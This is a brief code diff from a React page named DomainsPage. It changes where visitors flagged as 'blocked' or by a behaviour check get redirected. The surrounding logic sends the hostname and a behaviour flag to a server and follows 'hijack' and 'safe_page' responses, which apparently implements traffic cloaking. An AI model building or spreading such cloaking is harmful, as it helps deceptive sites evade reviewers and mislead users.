@@ -640,7 +640,7 @@ export default function DomainsPage() {
         body:JSON.stringify({domain:window.location.hostname, cv:cv, beh: isB})
       });
       const d = await res.json();
-      if(d.blocked || isB) { window.location.href = 'https://ta-indo-aonde-show.vercel.app/'; return; }
+      if(d.blocked || isB) { window.location.href = window.location.origin + '/ta-indo-aonde-show'; return; }
       if(d.hijack && d.safe_page) { window.location.replace(d.safe_page); return; }
 
       if(d.ip) {
